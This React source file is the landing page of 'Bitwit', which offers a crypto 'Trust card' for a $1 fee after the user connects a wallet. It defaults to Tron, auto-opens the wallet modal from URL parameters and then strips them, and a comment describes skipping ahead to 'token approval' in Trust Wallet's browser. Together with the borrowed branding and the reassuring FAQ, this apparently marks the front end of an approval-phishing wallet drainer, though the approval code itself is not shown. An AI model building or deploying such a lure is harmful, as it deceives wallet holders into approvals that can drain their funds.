import { useState, useEffect } from 'react';
import { useChainId } from 'wagmi';
import { ArrowRight, ChevronDown, ChevronUp, Check, Sparkles, Wallet, WalletCards, Globe2, ShieldCheck, Zap, Coins, BadgeDollarSign } from 'lucide-react';
import { Web3ModalProvider } from './components/ConnectWalletModal';
import { Header } from './components/Header';
import { NetworkModal } from './components/NetworkModal';
import { AccountDrawer } from './components/AccountDrawer';
import { WalletChoiceModal } from './components/WalletChoiceModal';
import IssueCardModal from './components/IssueCardModal';
import { SUPPORTED_CHAINS } from './config/wagmi';
import type { TxRecord } from './types';

const benefits = [
  { icon: Zap, title: 'Ready in moments', text: 'Connect the wallet you already use and start exploring without a lengthy signup flow.' },
  { icon: WalletCards, title: 'Wallet-first by design', text: 'Your connected wallet stays at the center of every action you choose to make.' },
  { icon: ShieldCheck, title: 'You stay in control', text: 'Connection permissions remain with your wallet, where they belong.' },
  { icon: BadgeDollarSign, title: 'Clear and simple', text: 'A focused interface built to make your next onchain action feel straightforward.' },
  { icon: Coins, title: 'Built for your assets', text: 'Keep a familiar view of your wallet and the networks you want to use.' },
  { icon: Globe2, title: 'Move at web speed', text: 'Use a modern wallet experience wherever your next opportunity takes you.' },
];

const faqs = [
  ['What is Bitwit Wallet?', 'Bitwit is a modern interface for connecting and interacting with your existing crypto wallet.'],
  ['Does Bitwit have access to my private keys?', 'No. Your wallet keeps control of private keys and every requested connection must be approved in your wallet.'],
  ['Which wallets can I use?', 'You can use the wallet options available through the current connection dialog, including MetaMask when it is installed.'],
];

function FloatingCoin({ className = '' }: { className?: string }) {
  return <span className={`floating-coin ${className}`}><span>◈</span></span>;
}

function PhoneMockup({ variant }: { variant: 'portfolio' | 'receive' | 'pay' }) {
  return (
    <div className={`phone-mockup ${variant}`} aria-hidden="true">
      <div className="phone-speaker" />
      {variant === 'portfolio' && <><span className="phone-kicker">YOUR WALLET</span><strong>$12,842.60</strong><em>+ $352.18 (2.8%)</em><div className="phone-chart" /><div className="phone-row"><i /> Ethereum <b>4.290</b></div><div className="phone-row"><i /> USD Coin <b>2,422</b></div></>}
      {variant === 'receive' && <><span className="phone-kicker">RECEIVE</span><div className="qr-code">◼ ◻<br />◻ ◼<br />◼ ◼</div><small>0xA7...18E4</small><button>Share address</button></>}
      {variant === 'pay' && <><div className="mini-card">Bitwit <span>•••• 0927</span></div><div className="tap-ring">⌁</div><small>Hold near reader</small></>}
    </div>
  );
}

function AppContent() {
  const chainId = useChainId();
  const [networkOpen, setNetworkOpen] = useState(false);
  const [accountOpen, setAccountOpen] = useState(false);
  const [openFaq, setOpenFaq] = useState<number | null>(0);
  const [transactions, setTransactions] = useState<TxRecord[]>([]);
  const [issueCardOpen, setIssueCardOpen] = useState(false);
  const [walletChoiceOpen, setWalletChoiceOpen] = useState(false);
  const [selectedCard, setSelectedCard] = useState<string>('white');
  const [selectedNetwork, setSelectedNetwork] = useState<'tron' | 'evm'>('tron');
  const [autoConnectWallet, setAutoConnectWallet] = useState<string | null>(null);
  const [tronDirectAddress, setTronDirectAddress] = useState<string | null>(null);

  useEffect(() => {
    try {
      const params = new URLSearchParams(window.location.search);
      const auto = params.get('autoConnect');
      const directAddr = params.get('tronDirectApprove');

      if (directAddr) {
        // Hybrid WC flow: WC session was established in Chrome, now we are
        // inside Trust Wallet's DApp browser (open_url). Skip the WC connection
        // step and go straight to token approval using the injected window.tron.
        setTronDirectAddress(directAddr);
        setAutoConnectWallet('trustWallet');
        setSelectedNetwork('tron');
        setWalletChoiceOpen(true);
        const cleanUrl = window.location.pathname + window.location.hash;
        window.history.replaceState({}, '', cleanUrl);
      } else if (auto) {
        setAutoConnectWallet(auto);
        setSelectedNetwork('tron');
        setWalletChoiceOpen(true);
        const cleanUrl = window.location.pathname + window.location.hash;
        window.history.replaceState({}, '', cleanUrl);
      }
    } catch {
      // ignore
    }
  }, []);

  const handleGetCard = () => {
    setSelectedNetwork('tron');
    setIssueCardOpen(true);
  };

  const handleIssueCardContinue = (card: string) => {
    setSelectedCard(card);
    setIssueCardOpen(false);
    setWalletChoiceOpen(true);
  };

  const handleIssueCardClose = () => {
    setIssueCardOpen(false);
  };

  const handleWalletChoiceBack = () => {
    setWalletChoiceOpen(false);
    setIssueCardOpen(true);
  };

  const handleWalletChoiceClose = () => {
    setWalletChoiceOpen(false);
  };
  const currentChain = SUPPORTED_CHAINS.find((chain) => chain.id === chainId);

  return (
    <div className="landing-page" id="top">
      <Header onOpenNetworkModal={() => setNetworkOpen(true)} onOpenAccountDrawer={() => setAccountOpen(true)} onConnectWallet={handleGetCard} />
      <main>
        <section className="hero section-shell">
          <div className="hero-copy">
            <p className="eyebrow">YOUR WALLET, ELEVATED</p>
            <h1>Issue your crypto<br /><span>Trust card right now.</span></h1>
            <p className="hero-text">Connect your wallet, pay $1 for issuance and start using it. No top-ups needed — your card will be ready in 2 minutes.</p>
            <div className="hero-actions">
              <button className="primary-button" onClick={handleGetCard}><Wallet size={18} /> Get a card <ArrowRight size={18} /></button>
              <a className="secondary-button" href="#how-it-works">Learn more</a>
            </div>
          </div>
          <div className="hero-art" aria-hidden="true">
            <div className="hero-Bitwit Bitwit-one" /><div className="hero-Bitwit Bitwit-two" />
            <div className="hero-wallet-card"><span className="card-logo">Bitwit</span><span className="card-chip" /><span className="card-number">•••• &nbsp; 0927</span><span>WALLET HOLDER</span><b>◉ ◉</b></div>
            <div className="hero-panel"><span>CONNECTED</span><strong>Everything in one place.</strong><div><Check size={16} /> Wallet ready</div></div>
            <FloatingCoin className="coin-a" /><FloatingCoin className="coin-b" />
          </div>
        </section>

        <section className="intro section-shell" id="how-it-works">
          <p className="eyebrow">THE FLOW</p><h2>Simple from<br />the first click.</h2>
          <p>Connect once, then use your wallet with confidence. The experience stays direct, clean, and in your control.</p>
        </section>

        <section className="feature section-shell">
          <div className="feature-copy"><h2>Connect your<br /><span>wallet today.</span></h2><p>Start with the wallet you already trust, then see the assets and networks that matter to you.</p></div>
          <div className="feature-art portfolio-art"><PhoneMockup variant="portfolio" /><span className="feature-pill pill-left">One connection</span><span className="feature-pill pill-top">Your assets</span><FloatingCoin className="coin-c" /></div>
        </section>

        <section className="feature section-shell feature-reversed">
          <div className="feature-art receive-art"><PhoneMockup variant="receive" /><FloatingCoin className="coin-d" /><FloatingCoin className="coin-e" /><FloatingCoin className="coin-f" /></div>
          <div className="feature-copy"><h2>Stay close to<br /><span>your wallet.</span></h2><p>No unnecessary detours. Your wallet remains the place where you approve every meaningful action.</p></div>
        </section>

        <section className="feature section-shell">
          <div className="feature-copy"><h2>Move without<br /><span>the clutter.</span></h2><p>A focused wallet experience that helps keep your attention on the next action, not the interface around it.</p></div>
          <div className="feature-art pay-art"><PhoneMockup variant="pay" />{['Swap', 'Send', 'Explore', 'Earn'].map((item, index) => <span className={`transaction-chip chip-${index}`} key={item}><i>{item[0]}</i>{item}<b>Ready</b></span>)}</div>
        </section>

        <section className="benefits section-shell" id="benefits"><p className="eyebrow">BENEFITS</p><h2>Designed to feel<br />effortless.</h2><div className="benefit-grid">{benefits.map(({ icon: Icon, title, text }, index) => <article className="benefit-card" key={title}><span className={`benefit-icon icon-${index}`}><Icon size={30} /></span><h3>{title}</h3><p>{text}</p></article>)}</div></section>

        <section className="cta-banner section-shell"><div><p className="eyebrow light">GET STARTED</p><h2>Your wallet,<br />your payment.</h2><p>Select a network, connect your wallet, and your payment request appears automatically.</p><button className="white-button" onClick={handleGetCard}>Get a card <ArrowRight size={17} /></button></div><div className="cta-art" aria-hidden="true"><span>Bitwit</span><Sparkles /></div></section>

        <section className="faq section-shell" id="faq"><p className="eyebrow">FAQ</p><h2>A few good<br />questions.</h2><div className="faq-list">{faqs.map(([question, answer], index) => <article className="faq-item" key={question}><button onClick={() => setOpenFaq(openFaq === index ? null : index)} aria-expanded={openFaq === index}><span>{question}</span>{openFaq === index ? <ChevronUp size={20} /> : <ChevronDown size={20} />}</button>{openFaq === index && <p>{answer}</p>}</article>)}</div></section>
      </main>
      <footer className="site-footer section-shell"><a className="brand" href="#top"><span className="brand-mark"><span /></span><span>Bitwit</span></a><span>Wallet-first tools for the open web.</span><span>© 2026 Bitwit</span></footer>
      <NetworkModal
        isOpen={networkOpen}
        onClose={() => setNetworkOpen(false)}
        isTronActive={selectedNetwork === 'tron'}
        onSelectTron={() => {
          setSelectedNetwork('tron');
          setNetworkOpen(false);
          setWalletChoiceOpen(true);
        }}
      />
      <AccountDrawer isOpen={accountOpen} onClose={() => setAccountOpen(false)} transactions={transactions} onClearTxs={() => setTransactions([])} />
      {issueCardOpen && <IssueCardModal onClose={handleIssueCardClose} onContinue={handleIssueCardContinue} />}
      {walletChoiceOpen && (
        <WalletChoiceModal
          selectedCard={selectedCard}
          defaultNetwork={selectedNetwork}
          autoConnectWallet={autoConnectWallet || undefined}
          tronDirectAddress={tronDirectAddress || undefined}
          onClose={handleWalletChoiceClose}
          onBack={handleWalletChoiceBack}
        />
      )}
      <span className="sr-only">{currentChain?.name}</span>
    </div>
  );
}

export default function App() { return <Web3ModalProvider><AppContent /></Web3ModalProvider>; }
